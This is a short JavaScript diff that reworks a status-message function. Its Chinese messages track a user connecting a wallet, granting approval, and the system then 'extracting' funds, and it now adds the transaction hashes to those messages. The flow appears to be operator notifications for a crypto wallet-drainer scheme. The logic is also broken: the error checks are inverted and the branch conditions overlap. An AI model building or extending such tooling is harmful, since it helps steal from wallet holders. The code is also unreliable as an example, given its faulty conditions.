@@ -19,18 +19,29 @@ const customRouter = AutoRouter({ base: '/custom' });
 
 /**
  * 根据状态返回对应的文本
- * @param {string} data - 状态字符串
+ * @param {notificationData} data - 状态
  * @returns {string} 对应的文本
  */
 function getStatusText(data) {
+  let text = '';
   if(data.contract_status === 'found' && data.approval_status === 'none' && data.transfer_status === 'none'){
-    return `用户已经连接钱包，等待授权`;
+    text = `用户已经连接钱包，等待授权`;
   }else if(data.contract_status === 'found' || data.approval_status === 'approved' || data.transfer_status === 'none'){
-    return `用户已经授权，准备提取`;
+    text = `用户已经授权，准备提取`;
+    text += `\napprovalTransactionHash: ${data.approvalTransactionHash}`;
   }else if(data.contract_status === 'found' || data.approval_status === 'approved' || data.transfer_status === 'transferred'){
-    return `系统已经提取成功`;
+    text = `系统提取成功`;
+    text += `\ntransferTransactionHash: ${data.transferTransactionHash}`;
   }
-  return `未知状态`;
+
+  if(!data.approvalErrorMessage){
+    text += `\n授权失败: ${data.approvalErrorMessage}`;
+  }
+  if(!data.transferErrorMessage){
+    text += `\n提取失败: ${data.transferErrorMessage}`;
+  }
+  return text;
+
 }
 
 /**
